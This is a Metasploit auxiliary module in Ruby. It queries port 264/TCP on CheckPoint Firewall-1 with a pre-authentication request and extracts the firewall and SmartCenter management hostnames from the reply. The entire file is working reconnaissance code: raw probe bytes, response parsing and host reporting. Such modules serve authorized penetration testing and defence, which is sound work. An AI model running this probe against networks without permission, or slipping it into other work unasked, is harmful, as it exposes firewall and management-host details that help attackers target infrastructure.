##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'CheckPoint Firewall-1 SecuRemote Topology Service Hostname Disclosure',
      'Description'    => %q{
        This module sends a query to the port 264/TCP on CheckPoint Firewall-1
        firewalls to obtain the firewall name and management station
        (such as SmartCenter) name via a pre-authentication request. The string
        returned is the CheckPoint Internal CA CN for SmartCenter and the firewall
        host. Whilst considered "public" information, the majority of installations
        use detailed hostnames which may aid an attacker in focusing on compromising
        the SmartCenter host, or useful for government, intelligence and military
        networks where the hostname reveals the physical location and rack number
        of the device, which may be unintentionally published to the world.
      },
      'Author'         => [ 'aushack' ],
      'DisclosureDate' => 'Dec 14 2011', # Looks like this module is first real reference
      'References'     =>
        [
          # aushack - None? Stumbled across, probably an old bug/feature but unsure.
          [ 'URL', 'http://www.osisecurity.com.au/advisories/checkpoint-firewall-securemote-hostname-information-disclosure' ],
          [ 'URL', 'https://supportcenter.checkpoint.com/supportcenter/portal?eventSubmit_doGoviewsolutiondetails=&solutionid=sk69360' ]
        ]
    ))

    register_options(
      [
        Opt::RPORT(264),
      ])
  end

  def autofilter
    false
  end

  def run
    print_status("Attempting to contact Checkpoint FW1 SecuRemote Topology service...")
    fw_hostname = nil
    sc_hostname = nil

    connect

    sock.put("\x51\x00\x00\x00")
    sock.put("\x00\x00\x00\x21")
    res = sock.get_once(4)
    if (res and res == "Y\x00\x00\x00")
      print_good("Appears to be a CheckPoint Firewall...")
      sock.put("\x00\x00\x00\x0bsecuremote\x00")
      res = sock.get_once
      if (res and res =~ /CN=(.+),O=(.+)\./i)
        fw_hostname = $1
        sc_hostname = $2
        print_good("Firewall Host: #{fw_hostname}")
        print_good("SmartCenter Host: #{sc_hostname}")
      end
    else
      print_error("Unexpected response: '#{res.inspect}'")
    end

    report_info(fw_hostname,sc_hostname)

    disconnect
  end

  # Only trust that it's real if we have a hostname. If you get a funny
  # response, it might not be what we think it is.
  def report_info(fw_hostname,sc_hostname)
    return unless fw_hostname
    host_info = {
      :host => datastore['RHOST'],
      :os_name => "Checkpoint Firewall-1",
      :purpose => "firewall"
    }
    host_info[:name] = fw_hostname
    host_info[:info] = "SmartCenter Host: #{sc_hostname}" if sc_hostname
    report_host(host_info)
    svc_info = {
      :host => datastore['RHOST'],
      :port => datastore['RPORT'],
      :proto => "tcp",
      :name => "securemote"
    }
    report_service(svc_info)
  end
end
